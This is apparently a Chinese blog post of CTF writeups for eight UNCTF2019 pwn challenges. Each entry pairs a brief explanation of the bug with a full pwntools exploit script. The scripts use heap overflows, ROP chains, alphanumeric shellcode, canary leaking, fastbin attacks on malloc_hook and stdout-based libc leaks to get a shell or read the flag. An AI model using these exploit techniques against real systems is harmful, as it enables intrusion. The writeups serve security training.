@@ -1,0 +1,688 @@
+---
+layout: post
+title:  "UNCTF2019 PWN writeup"
+tags: [pwn, ctf]
+date: 2019-10-27
+comments: false
+---
+
+# UNCTF2019 PWN
+
+参加的时候就剩两天结束比赛了，官方说题目已经更新完毕，花了一天多时间把PWN AK了，很久没做PWN了，为下周的省赛热热身.  
+
+![OpjBRgevowLZJCS](https://i.loli.net/2019/10/27/OpjBRgevowLZJCS.jpg)
+
+## 1babyheap
+
+edit处堆溢出，把`\x00`填满通过puts泄露libc，改puts来getshell
+
+exp:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+#io = process("./pwn")
+io = remote("101.71.29.5",10052)
+
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+
+def add(c):
+    sla("Your choice: ",1)
+    sla("input content: ",c)
+
+def edit(idx,l,c):
+    sla("Your choice: ",2)
+    sla("Plz input index: ",idx)
+    sla("Plz input size: ",l)
+    sla("Plz input content: ",c)
+
+def show(idx):
+    sla("Your choice: ",3)
+    sla("Plz input index: ",idx)
+
+def dele(idx):
+    sla("Your choice: ",4)
+
+
+add('0')
+add('1')
+edit(0,0x18,'a'*0x17)
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+show(0)
+io.recvuntil("aaa\x0a")
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - libc.symbols['puts']
+success('libcbase: '+hex(libcbase))
+
+
+edit(0,0x20,'/bin/sh\x00'+'a'*0x10+p64(libcbase + libc.symbols['system']))
+show(0)
+irt()
+#UNCTF{3c57f173892d602ca92ccf7e9bbf38ea}
+```
+
+## 2babyrop
+
+第一处溢出改0x66666666,第二处限制返回地址只能在text段，但只限制了第一次返回。第一次返回到text，在后面的rop链ret2libc
+
+exp:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10041)
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+elf = ELF("./pwn")
+
+
+pay1 = "a"*0x20+p32(0x66666666)
+sla("!\n",pay1)
+
+pay2 = "a"*0x14+p32(elf.plt["puts"])+p32(0x0804853D)+p32(elf.got['puts'])
+sla("What is your name?\n",pay2)
+
+#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+libcbase = u32(io.recv(4)) - 0x05f140#- libc.symbols['puts']
+success("libcbase: "+hex(libcbase))
+'''
+https://libc.nullbyte.cat
+
+
+libc6-i386_2.23-0ubuntu10_amd64
+    Symbol  Offset  Difference
+    system  0x03a940    0x0
+    puts    0x05f140    0x24800
+    open    0x0d3f40    0x99600
+    read    0x0d4350    0x99a10
+    write   0x0d43c0    0x99a80
+    str_bin_sh  0x15902b    0x11e6eb
+All symbols
+'''
+
+p1ret = 0x080483b5
+pay3 = "a"*0x14+p32(elf.plt["puts"])+p32(p1ret)+p32(elf.got['puts']) + p32(libcbase  + 0x03a940) + 'aaaa'+p32(libcbase  +   0x15902b)
+sla("What is your name?\n",pay3)
+irt()
+#UNCTF{7ef293810e29039f061982e72fd10bfb}
+```
+
+## 3EasyShellcode
+
+纯字母shellcode
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10080)
+sc = "PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA"
+io.sendlineafter("?\n",sc)
+io.interactive()
+#UNCTF{x64_A5c11_shE11c0dE_i5_50_Ea5y}
+```
+
+## 4easystack
+
+数组下标溢出，可以盖到返回地址，但是需要先leak canary。  
+
+一共可以进行四次运算，canary的可能性有`2**24`种。  
+
+先将`0~0xffffff`平分，可以将canary确定在一个小区间内。如此进行三次，即可确定canary。  
+
+第四次rop。  
+
+exp:
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10036)
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+L = [1, 65536, 131072, 196608, 262144, 327680, 393216, 458752, 524288, 589824, 655360, 720896, 786432, 851968, 917504, 983040, 1048576, 1114112, 1179648, 1245184, 1310720, 1376256, 1441792, 1507328, 1572864, 1638400, 1703936, 1769472, 1835008, 1900544, 1966080, 2031616, 2097152, 2162688, 2228224, 2293760, 2359296, 2424832, 2490368, 2555904, 2621440, 2686976, 2752512, 2818048, 2883584, 2949120, 3014656, 3080192, 3145728, 3211264, 3276800, 3342336, 3407872, 3473408, 3538944, 3604480, 3670016, 3735552, 3801088, 3866624, 3932160, 3997696, 4063232, 4128768, 4194304, 4259840, 4325376, 4390912, 4456448, 4521984, 4587520, 4653056, 4718592, 4784128, 4849664, 4915200, 4980736, 5046272, 5111808, 5177344, 5242880, 5308416, 5373952, 5439488, 5505024, 5570560, 5636096, 5701632, 5767168, 5832704, 5898240, 5963776, 6029312, 6094848, 6160384, 6225920, 6291456, 6356992, 6422528, 6488064, 6553600, 6619136, 6684672, 6750208, 6815744, 6881280, 6946816, 7012352, 7077888, 7143424, 7208960, 7274496, 7340032, 7405568, 7471104, 7536640, 7602176, 7667712, 7733248, 7798784, 7864320, 7929856, 7995392, 8060928, 8126464, 8192000, 8257536, 8323072, 8388608, 8454144, 8519680, 8585216, 8650752, 8716288, 8781824, 8847360, 8912896, 8978432, 9043968, 9109504, 9175040, 9240576, 9306112, 9371648, 9437184, 9502720, 9568256, 9633792, 9699328, 9764864, 9830400, 9895936, 9961472, 10027008, 10092544, 10158080, 10223616, 10289152, 10354688, 10420224, 10485760, 10551296, 10616832, 10682368, 10747904, 10813440, 10878976, 10944512, 11010048, 11075584, 11141120, 11206656, 11272192, 11337728, 11403264, 11468800, 11534336, 11599872, 11665408, 11730944, 11796480, 11862016, 11927552, 11993088, 12058624, 12124160, 12189696, 12255232, 12320768, 12386304, 12451840, 12517376, 12582912, 12648448, 12713984, 12779520, 12845056, 12910592, 12976128, 13041664, 13107200, 13172736, 13238272, 13303808, 13369344, 13434880, 13500416, 13565952, 13631488, 13697024, 13762560, 13828096, 13893632, 13959168, 14024704, 14090240, 14155776, 14221312, 14286848, 14352384, 14417920, 14483456, 14548992, 14614528, 14680064, 14745600, 14811136, 14876672, 14942208, 15007744, 15073280, 15138816, 15204352, 15269888, 15335424, 15400960, 15466496, 15532032, 15597568, 15663104, 15728640, 15794176, 15859712, 15925248, 15990784, 16056320, 16121856, 16187392, 16252928, 16318464, 16384000, 16449536, 16515072, 16580608, 16646144, 16711680, 16777215]
+
+def sp(li,l,r): 
+    if l==r:
+        return
+    #print l,r
+    li.append((l+r)/2)
+    if ((l+r)/2)%2 == 1:
+        sp(li,l,(l+r)/2)
+        sp(li,(l+r)/2,r)
+    else:
+        sp(li,l,(l+r)/2-1)
+        sp(li,(l+r)/2+1,r)
+def calc(l,r,parts):
+    li = []
+    li.append(l)
+    li.append(r)
+    sp(li,l,r)
+    li.sort()
+    finalli = []
+    for x in range(0,len(li),((len(li)-1)/parts)):
+        finalli.append(li[x])
+    return finalli
+
+
+
+sla("How much do you want to calc: ",301)
+for x in range(43):
+    sla("num?(Input 0 to stop): ",1)
+for x in L:
+    sla("num?(Input 0 to stop): ",x*0x100)
+sla(": ",'0')
+ru("is ")
+c = io.recvuntil("Do you",drop=True)
+L2 = calc(L[int(c)*(-1)-1]+1,L[int(c)*(-1)]+1,256)
+
+
+
+sla("n)",'y')
+sla("How much do you want to calc: ",301)
+for x in range(43):
+    sla("num?(Input 0 to stop): ",1)
+for x in L2:
+    sla("num?(Input 0 to stop): ",x*0x100)
+sla(": ",'0')
+ru("is ")
+c = io.recvuntil("Do you",drop=True)
+L3 = calc(L2[int(c)*(-1)-1],L2[int(c)*(-1)],256)
+
+
+
+sla("n)",'y')
+sla("How much do you want to calc: ",301)
+for x in range(43):
+    sla("num?(Input 0 to stop): ",1)
+for x in L3:
+    sla("num?(Input 0 to stop): ",x*0x100)
+sla(": ",'0')
+ru("is ")
+c = io.recvuntil("Do you",drop=True)
+canary = L3[int(c)*(-1)-1]*0x100
+success("canary: "+hex(canary))
+
+
+
+
+
+elf = ELF('./pwn')
+put = 0x08048750
+cout = 0x0804A0C0
+vuladdr = 0x080488E7
+setbufgot = 0x08049FD4
+
+rop = [cout,1,1,put,vuladdr,cout,setbufgot]
+
+sla("n)",'y')
+
+sla("How much do you want to calc: ",310)
+
+#gdb.attach(io)
+for x in range(300):
+    sla("num?(Input 0 to stop): ",1)
+sla("num?(Input 0 to stop): ",canary)
+for r in rop:
+    sla("num?(Input 0 to stop): ",r)
+
+sla(": ",'0')
+sla("n)",'y')
+libcbase = u32(io.recvuntil("How")[1:5]) - 0x065450
+success("libcbase: "+hex(libcbase))
+#irt()
+sysaddr = libcbase + 0x03a940
+binshaddr = libcbase +  0x15902b
+
+
+
+
+rop2 = [cout,1,1,sysaddr,vuladdr,binshaddr]
+sla("t to calc: ",310)
+for x in range(300):
+    sla("num?(Input 0 to stop): ",1)
+sla("num?(Input 0 to stop): ",canary)
+for r in rop2:
+    sla("num?(Input 0 to stop): ",r)
+
+sla(": ",'0')
+sla("n)",'y')
+
+
+irt()
+#UNCTF{B00m!Y0u_G5t_CaNarY!gOOD}
+```
+
+## 5box
+
+使用realloc来完成内存分配，当传入size为0时相当于free。  
+
+chunklist下标可以上下溢出，输入`idx=-4`可以将`idx=0`处的chunk size覆盖为很大的数来造成堆溢出  
+
+向下输入很大的idx可以将ptr写在heap上，因此可以突破限制malloc任意数量的chunk  
+
+堆溢出改size再free可以得到unsorted bin，利用产生的libc地址改低两字节来打stdout leak libc，需要爆破一下  
+
+利用dele功能里的free和realloc的free来double free打realloc hook，改成system地址再以size=0 realloc一个内容为`/bin/sh`的chunk即可getshell  
+
+```python
+from pwn import *
+#context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+io = process("./Box")
+#io = remote("101.71.29.5",10035)
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+
+def add(idx,l):
+    sla("Your Choice: ",1)
+    sla("Box ID: ",idx)
+    sla("Box Size: ",l)
+
+def edit(idx,c):
+    sla("Your Choice: ",2)
+    sla("Box ID: ",idx)
+    sla("Box Content: ",c)
+
+def dele(idx):
+    sla("Your Choice: ",3) 
+    sla("Box ID: ",idx)
+
+
+add(0,0)
+#add(2,0x60)
+add(-4,0x60)
+add(3,0x60)
+#add(4,0x60)
+add(9100,0x60)
+add(9101,0x60)
+pay = 'a'*0x18+p64(0xe1)+'a'*0x68+p64(0x71)+'a'*0x68+p64(0x71)
+edit(0,pay)
+add(3,0)
+add(-4,0)
+add(-4,0x30)
+add(9102,0x20)
+#add(13,0x60)
+sla("Your Choice: ",2)
+sla("Box ID: ",0)
+pay2 = 'a'*0x18 + p64(0x41)+'a'*0x38+p64(0x31)+'a'*0x28+p64(0x71)+'\xdd\x25'
+sa("Box Content: ",pay2)
+add(9113,0x60)
+add(3,0x60)
+
+pay3 = 'a'*0x33 + p64(0x00000000fbad1800)+p64(0)*3+'\x40'
+sla("Your Choice: ",2)
+sla("Box ID: ",3)
+sa("Box Content: ",pay3)
+
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - 0x3c5640
+success('libcbase: '+hex(libcbase))
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+add(9100,0)
+add(9101,0)
+add(1,0x60)
+dele(1)
+add(9113,0)
+add(1,0)
+
+
+
+
+fakechunk = mallochookaddr - 0x23
+
+sysaddr  = libcbase  + libc.symbols['system']
+
+
+add(0,0x60)
+edit(0,p64(fakechunk))
+add(9105,0x60)
+add(9106,0x60)
+add(1,0x60)
+
+
+add(0,0x50)
+edit(0,"/bin/sh\x00")
+edit(1,'b'*(11)+p64(sysaddr))
+success("malloc: "+hex(mallocaddr))
+#debug()
+add(0,0)
+irt()
+#UNCTF{351322f81bf2702405c59deec50eb018}
+```
+
+## 6Driver
+
+这题好像打了个非预期= =，从flag来看预期是unlink+house_of_sprit，所以题目给的leakpie和license功能没利用到= =。  
+
+我的方法是fastbin attack打malloc_hook  
+
+漏洞点是`off-by-null`
+
+麻烦点在只能分配三个chunk而且固定size，难点在堆布局。  
+
+在提速的地方，利用好遗留下的libc地址可以leak libc  
+
+构造一个overlapped chunk来控制fastbin chunk的fd，fastbin attack打mallochook  
+
+exp:
+
+```python
+from pwn import *
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x' , 'sh' , '-c']
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10015)
+
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+
+def add(t,c):
+    sla("Your Choice>> \n",1)
+    sla("Your Choice>> \n",t)
+    sa("r's name: \n",c)
+
+def show():
+    sla("Your Choice>> \n",2)
+
+def dele(idx):
+    sla("Your Choice>> \n",3)
+    sla("Please input car's index: ",idx)
+
+
+def edit(idx,c):
+    sla("Your Choice>> \n",4)
+    sla("Please input car's index: ",idx)
+    sa("Please input name: ",c)
+
+def speedup(idx,t):
+    sla("Your Choice>> \n",5)
+    sla("ndex: ",idx)
+    sla("hoice>> ",1)
+    sla("r Choice>> ",t)
+
+def getpie():
+    sla("Your Choice>> \n",8)
+    io.recvuntil("gift: ")
+    return int(io.recv(14),16)-0x204010
+
+codebase = getpie()
+success("codebase: "+hex(codebase))
+#add(2,'a'*0x68)
+
+for x in range(3):
+    add(3,x)
+for x in range(3):
+    dele(x)
+add(3,0)#0
+add(1,1)#1
+dele(0)
+add(2,0)#0
+add(3,2)#2
+
+dele(2)
+edit(1,'1'*0x60+p64(0x2e0))
+dele(0)
+add(2,0)#0
+speedup(1,2)
+io.recvuntil("Car's Speed is ")
+libcbase = (int(io.recvuntil("Km/h",drop=True))/2) - 0x3c4b78
+success("libcbase: "+hex(libcbase))
+dele(1)
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+mallochookaddr = libcbase + libc.symbols['__malloc_hook']
+libcrealloc = libcbase + libc.symbols['__libc_realloc']
+fakechunk = mallochookaddr - 0x23
+success('mallochook ' +hex(mallochookaddr))
+onegad  = libcbase + 0xf02a4#0xf02a4#0xf1147
+
+
+add(3,"2"*0x120+p64(0)+p64(0x41)+p64(0)*6+p64(0)+p64(0x71)+p64(fakechunk))
+dele(0)
+
+add(1,0)
+add(1,'b'*(19-8)+p64(onegad) + p64(libcrealloc+0x14))
+dele(0)
+
+#add(1,0)
+irt()
+#UNCTF{Unl1nk_AnD_H0u5e_0f_Sp1r1t_1s_EAsy}
+```
+
+## 7Soso_easy_pwn
+
+题目有后门函数  
+
+题目给出出codebase的高两字节,后门函数低12位固定，只需爆破4位地址即可得到后门函数地址  
+
+gdb调一下发现第二个函数最后call的是第一个函数输入的后四字节  
+
+在第一个函数中后四字节输入后门函数地址  
+
+exp:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.terminal = ['terminator' , '-f' , '-x', 'sh' , '-c']
+
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10000)
+
+io.recvuntil("Welcome our the ")
+code = int(io.recvuntil(" world",drop=True)) << 16
+success("code: "+hex(code))
+
+sysaddr = code+0x59cd
+
+io.sendafter("So, Can you tell me your name?\n",'a'*12+p32(sysaddr))
+
+io.sendlineafter("ebye):",'1')
+io.interactive()
+#UNCTF{S0_so_E4zy_Pwn}
+```
+
+## 8orwHeap
+
+题目调用prctl禁用了execve，再加上题目名字可以联想到要打stack来rop。  
+
+详细利用方式见我原来的一篇文章:https://leeeddin.github.io/attack-stack-with-heap-vuln/  
+
+漏洞点是off-by-null,老方法fastbin attack打stdout泄露libc，stack，codebase  
+
+难点在找stack上面合适的size(0x7f)，尝试了很多位置，甚至尝试leak canary都没成功。最后在edit功能的read函数ret时的stack中找到了一个合适的size，可以写64字节的rop，配合寄存器中遗留的数据可以做栈迁移到bss来进行后续rop。  
+
+最后通过open read write rop来读flag  
+
+exp:
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.terminal =  ['terminator' , '-f' , '-x' , 'sh' , '-c']
+
+#io = process("./pwn")
+io = remote("101.71.29.5",10005)
+s = lambda a: io.send(str(a))
+sa = lambda a, b: io.sendafter(str(a), str(b))
+st = lambda a, b: io.sendthen(str(a), str(b))
+sl = lambda a: io.sendline(str(a))
+sla = lambda a, b: io.sendlineafter(str(a), str(b))
+slt = lambda a, b: io.sendlinethen(str(a), str(b))
+r = lambda a=4096: io.recv(a)
+rl = lambda: io.recvline()
+ru = lambda a: io.recvuntil(str(a))
+irt = lambda: io.interactive()
+def debug():
+    gdb.attach(io)
+    io.interactive()
+
+def add(s,c):
+    sla("Your Choice: ",1)
+    sla("Please input size: ",s)
+    sla("Please input content: ",c)
+
+def dele(idx):
+    sla("Your Choice: ",2)
+    sla("Please input idx: ",idx)
+
+def edit(idx,c):
+    sla("Your Choice: ",3)
+    sla("Please input idx: ",idx)
+    sa("Please input content: ",c)
+
+
+
+add(0x88,'0')#0
+add(0x68,'1')#1
+add(0x68,'2')
+add(0xf8,'3')#3
+add(0x68,'4')#4
+dele(2)
+add(0x68,'2'*0x60+p64(0x170))#2
+
+dele(0)
+dele(3)
+dele(2)
+
+add(0xf0,'0')
+add(0x160,'2')
+edit(2,'\xdd\x25')
+dele(0)
+dele(2)
+add(0x260,'0'*0x88+p64(0x71)+'1'*0x68+p32(0x71))#0
+
+add(0x68,'2')
+add(0x68,'3')
+edit(3,'\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x40')
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - 0x3c5640
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+success("libcbase: "+hex(libcbase))
+environ = libcbase + libc.symbols['environ']
+success("environ: "+hex(environ))
+#edit(3,'\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+p64(environ))
+edit(3,'\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8))
+leakstack = u64(io.recv(6).ljust(8,'\x00'))
+success("leakstack: "+hex(leakstack))
+codeptr = leakstack - 0x30
+edit(3,'\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+p64(codeptr)+p64(codeptr+0x8)+ p64(codeptr+0x8))
+codebase  = u64(io.recv(6).ljust(8,'\x00'))-0x969
+success("codebase: "+hex(codebase))
+
+
+
+
+dele(2)
+fakechunk = leakstack - 0x17b
+success("fakechunk: "+hex(fakechunk))
+edit(0,'0'*0x88+p64(0x71)+'1'*0x68+p64(0x71)+p64(fakechunk))
+add(0x68,'2')
+
+add(0x68,'5')
+
+prdiret = 0x0000000000001193+codebase
+prsiret = 0x00000000000202e8+libcbase
+prdxrsiret = 0x00000000001150c9+libcbase# : pop rdx ; pop rsi ; ret
+leaveret = 0x0000000000000b40+codebase
+prbp = 0x000000000001f930+libcbase
+bss = codebase + 0x202000
+openaddr = libcbase + libc.symbols['open']
+read = libcbase + libc.symbols['read']
+writeaddr = libcbase + libc.symbols['write']
+
+
+rop1 = p64(prbp)+p64(bss+0x200)+p64(prsiret)+p64(bss+0x200)+p64(read)+p64(leaveret)
+
+rop2 = p64(0)+p64(prbp)+p64(bss+0x300)+p64(prdiret)+p64(0)+p64(prdxrsiret)+p64(0x200)+p64(bss+0x300)+p64(read)+p64(leaveret)
+
+rop3 = p64(0)+p64(prdiret)+p64(codebase+0x202388+8)+p64(prsiret)+p64(0)+p64(openaddr)+p64(prdiret)+p64(3)+p64(prdxrsiret)+p64(0x40)+p64(bss+0x500)+p64(read)+p64(prdiret)+p64(1)+p64(prdxrsiret)+p64(0x40)+p64(bss+0x500)+p64(writeaddr)+"/flag\x00"
+edit(5,'\x00'*(0x2b)+rop1)#p64(0xdeadbeef))
+sleep(1)
+sl(rop2)
+sleep(1)
+sl(rop3)
+irt()
+#flag{c904a5fd6b14dcb7bce8d72bf7e4401b}
+```
